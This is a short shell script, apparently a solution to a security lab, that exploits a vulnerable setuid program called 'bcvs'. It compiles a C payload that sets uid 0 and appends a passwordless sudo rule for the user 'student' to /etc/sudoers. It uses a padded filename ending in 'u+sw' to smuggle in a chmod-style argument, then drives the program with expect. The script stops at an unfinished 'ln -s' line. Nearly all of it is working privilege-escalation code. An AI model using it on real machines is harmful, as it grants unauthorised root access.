#not a thing 

file="aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaau+sw"

cd /opt/bcvs
touch hack.c
echo '
#include <stdlib.h>
#include <unistd.h>
void main() {
    setuid(0);
    system("printf \"\nstudent ALL=(ALL) NOPASSWD: ALL\n\" >> /etc/sudoers");
}
' >> hack.c
cc hack.c -o aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaau+sw
touch yeehaw

/usr/bin/expect -c '
sleep 0.5
cd /opt/bcvs
sleep 0.5
spawn ./bcvs ci yeehaw
sleep 0.5
expect "Please write a SHORT explanation:\r"
sleep 0.5
send "hello\n"
sleep 0.5
'

ln -s 